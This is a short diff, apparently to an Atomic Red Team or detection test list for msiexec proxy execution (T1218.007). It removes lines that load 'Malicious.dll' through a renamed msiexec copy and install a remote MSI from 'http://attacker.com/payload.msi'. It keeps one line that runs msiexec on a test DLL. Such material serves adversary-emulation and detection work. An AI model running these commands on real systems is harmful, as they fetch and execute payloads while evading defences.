@@ -1,4 +1,1 @@
-c:\windows\system32\msiexec.exe  /y "C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"
-copy msiexec.exe C:\Users\Public\ ot\_msiexec.exe && C:\Users\Public\ ot\_msiexec.exe /y Malicious.dll
-msiexec.exe /i "http://attacker.com/payload.msi"
-msiexec.exe /y "malicious.dll"
+c:\windows\system32\msiexec.exe /y "C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"
